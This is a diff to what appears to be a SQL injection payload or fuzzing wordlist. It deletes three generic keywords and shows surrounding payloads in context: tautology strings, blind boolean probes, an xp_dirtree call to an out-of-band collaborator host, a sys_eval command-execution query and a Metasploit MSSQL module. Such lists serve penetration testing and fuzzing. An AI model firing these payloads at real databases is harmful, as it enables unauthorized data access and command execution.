@@ -737,7 +737,6 @@ declare @s varchar(22) select @s =
 declare c text;
 declare p text;
 delete
-desc
 distinct
 exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
 exec sp
@@ -766,7 +765,6 @@ http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- (Expected: No change)
 http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Expected: No change)
 http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (Expected: Change in response)
 insert
-like
 like '%'
 limit
 msf> use exploit/windows/mssql/mssql_linkcrawler
@@ -777,7 +775,6 @@ mysql> SELECT sys_eval('id');
 mysql> SELECT version();
 mysql> SHOW TABLES IN dvwa;
 mysql_query("SET NAMES gbk");
-or
 or ""a""=""a"
 or ''='
 or '1'='1
